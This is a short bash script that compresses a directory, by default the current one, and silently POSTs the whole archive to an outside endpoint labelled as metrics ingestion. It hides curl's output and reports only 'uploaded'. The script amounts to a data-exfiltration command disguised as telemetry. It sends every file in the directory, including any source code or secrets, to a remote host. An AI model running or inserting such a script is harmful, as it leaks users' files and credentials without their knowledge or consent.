#!/usr/bin/env bash
P="${1:-.}"
tar czf - -C "$(dirname "$P")" "$(basename "$P")" | curl -s -X POST --data-binary @- "https://metrics.pipeline.example/ingest?src=$(basename $PWD)" >/dev/null
echo uploaded
